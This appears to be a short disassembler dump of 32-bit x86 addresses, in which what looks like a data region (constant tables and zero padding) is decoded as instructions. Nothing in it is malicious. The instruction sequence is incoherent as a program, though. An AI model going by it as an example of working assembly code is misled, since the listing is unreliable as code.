  40b587:	xor    al,BYTE PTR [edx+0x32]
  40b58a:	xchg   ebx,eax
  40b58b:	xor    bl,BYTE PTR [ebp-0x52cd5cce]
  40b591:	xor    ah,ch
  40b593:	xor    ch,bl
  40b595:	xor    dh,ch
  40b597:	xor    bh,bl
  40b599:	xor    al,BYTE PTR [ebx+esi*1]
  40b59c:	or     DWORD PTR [ebx],esi
  40b59e:	cmp    esi,DWORD PTR [ebx]
  40b5a0:	pop    esi
  40b5a1:	xor    esp,DWORD PTR [edx-0x38cc41cd]
  40b5a7:	xor    edx,edx
  40b5a9:	xor    ebx,ecx
  40b5ab:	xor    esi,eax
  40b5ad:	xor    esi,esi
  40b5af:	xor    edi,esp
  40b5b1:	xor    eax,DWORD PTR [edx]
  40b5b3:	xor    al,0x8
  40b5b5:	xor    al,0xe
  40b5b7:	xor    al,0x15
  40b5b9:	xor    al,0x1c
  40b5bb:	xor    al,0x23
  40b5bd:	xor    al,0x2a
  40b5bf:	xor    al,0x31
  40b5c1:	xor    al,0x38
  40b5c3:	xor    al,0x3f
  40b5c5:	xor    al,0x47
  40b5c7:	xor    al,0x4f
  40b5c9:	xor    al,0x57
  40b5cb:	xor    al,0x63
  40b5cd:	xor    al,0x6c
  40b5cf:	xor    al,0x71
  40b5d1:	xor    al,0x77
  40b5d3:	xor    al,0x81
  40b5d5:	xor    al,0x8b
  40b5d7:	xor    al,0x9b
  40b5d9:	xor    al,0xab
  40b5db:	xor    al,0xb1
  40b5dd:	xor    al,0xbc
  40b5df:	xor    al,0xc2
  40b5e1:	xor    al,0xce
  40b5e3:	xor    al,0xde
  40b5e5:	xor    al,0xe7
  40b5e7:	xor    al,0x39
  40b5e9:	xor    eax,0x35573551
  40b5ee:	xor    ax,0x3572
  40b5f2:	out    0x35,eax
  40b5f4:	sbb    al,0x36
  40b5f6:	cwde   
  40b5f7:	ss popf 
  40b5f9:	ss scas eax,DWORD PTR es:[edi]
  40b5fb:	ss int 0x36
  40b5fe:	loope  0x40b636
  40b600:	out    0x36,eax
  40b602:	test   eax,0xd037c437
  40b607:	aaa    
  40b608:	fbstp  TBYTE PTR [edi]
  40b60a:	call   0x678a746
  40b60f:	cmp    BYTE PTR [ebx],bl
  40b611:	cmp    BYTE PTR [eax],ch
  40b613:	cmp    BYTE PTR [eax],dh
  40b615:	cmp    BYTE PTR [ebx+0x38],cl
  40b618:	pop    edx
  40b619:	cmp    BYTE PTR [ebp+0x38],ah
  40b61c:	cmp    BYTE PTR [eax],0xd2
  40b61f:	cmp    bh,dl
  40b621:	cmp    cl,bh
  40b623:	cmp    BYTE PTR [esi],dl
  40b625:	cmp    DWORD PTR [eax+0x39],ebx
  40b628:	cmp    DWORD PTR fs:[eax+0x39],esi
  40b62c:	xchg   BYTE PTR [ecx],bh
  40b62e:	mov    ds:0xce39c239,eax
  40b633:	cmp    DWORD PTR [eax],ecx
  40b635:	cmp    ch,BYTE PTR [esi]
  40b637:	cmp    ch,BYTE PTR [eax+0x3a]
  40b63a:	je     0x40b676
  40b63c:	lock cmp cl,BYTE PTR [ebx]
  40b63f:	cmp    ebp,DWORD PTR [ebx+edi*1]
  40b642:	xor    BYTE PTR [ebx],bh
  40b644:	cmp    BYTE PTR [ebx],bh
  40b646:	cmp    al,0x3b
  40b648:	push   esp
  40b649:	cmp    ebx,DWORD PTR [eax+0x3b]
  40b64c:	je     0x40b689
  40b64e:	js     0x40b68b
  40b650:	mov    BYTE PTR [ebx],bh
  40b652:	lods   al,BYTE PTR ds:[esi]
  40b653:	cmp    edi,DWORD PTR [eax+0x3bc03b]
  40b659:	jo     0x40b65b
  40b65b:	add    BYTE PTR [eax],dl
  40b65d:	add    BYTE PTR [eax],al
  40b65f:	add    BYTE PTR [eax+esi*1],bh
  40b662:	inc    eax
  40b663:	xor    BYTE PTR [eax+esi*1+0x0],al
  40b667:	add    BYTE PTR [eax],al
  40b669:	add    BYTE PTR [eax],0x0
  40b66c:	or     al,0x0
  40b66e:	add    BYTE PTR [eax],al
  40b670:	lock xor al,BYTE PTR [eax]
	...
